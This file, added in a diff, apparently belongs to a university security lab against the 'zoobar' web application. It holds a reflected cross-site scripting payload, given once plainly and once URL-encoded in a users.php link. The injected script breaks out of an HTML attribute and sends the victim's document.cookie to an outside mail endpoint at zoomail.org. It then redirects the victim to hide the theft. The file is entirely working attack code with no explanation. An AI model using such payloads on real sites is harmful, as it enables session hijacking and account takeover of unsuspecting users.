@@ -1,0 +1,8 @@
+
+(Non URL Encoded version)
+
+" size=10><script>javascript:void((new Image()).src='http://zoomail.org/sendmail.php?&netid=jwvazquez_ndraves&payload='+document.cookie+'&random='+Math.random());window.location.assign("http://zoobar.org/users.php");</script>
+
+(URL version)
+
+http://zoobar.org/users.php?user=%22\%20\size\%3D10\%3E\%3Cscript\%3Ejavascript\%3Avoid\%28\%28new\%20Image\%28\%29\%29.src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3F\%26netid\%3Djwvazquez_ndraves\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random\%28\%29\%29\%3Bwindow.location.assign\%28\%22http\%3A\%2F\%2Fzoobar.org\%2Fusers.php\%22\%29\%3B\%3C/script\%3E
